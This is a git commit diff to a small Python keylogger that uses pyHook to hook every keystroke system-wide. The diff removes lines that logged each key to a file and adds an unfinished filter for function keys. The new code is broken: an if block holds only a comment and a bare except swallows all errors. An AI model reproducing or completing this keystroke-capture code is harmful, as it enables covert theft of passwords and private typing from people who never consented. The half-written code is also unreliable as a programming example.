1bf91949bc674c494bbdff5ee63710904e776328
MrB4N4N4 <2016rudgns@naver.com>
2021-08-10 17:33:06 +0900

    Process combination keys?

--- src/main.py
+++ src/main.py
@@ -2,22 +2,27 @@ import pythoncom, pyHook
 
 FILE_NAME = "result.txt"
 
-def OnKeyboardEvent(event):
-    try:
-        print("key: ", event.Key)
-        print("Ascii: ", event.Ascii)
-        with open(FILE_NAME, "a") as f:
-            info = "key: " + str(event.Key) + "\n"
-            f.write(info)
+def CombinationKeys(key):
+    if key in ["Lshift", "Rshift"]:
+        return True
+    if key in ["Space", "Return", "Back", "Tab"]:
+        return "\n"
 
-    except TypeError as error:
-        print("Error: ", error)
+def OnKeyboardEvent(event):
+    # functional keys to filter. Available to add other key.
+    func_keys = ["Space", "Return", "Back", "Tab", "Lshift", "Lcontrol", "Lmenu"]
+    try:
+        key = str(event.Key)
+        if key in func_keys:
+            # restart point
+
+    except:
+        pass
 
 # return True to pass th event to other handlers.
     return True
 
-
-# create a hook manager.python key logger test
+# create a hook manager.
 hm = pyHook.HookManager()
 # watch for all events.
 hm.KeyDown = OnKeyboardEvent
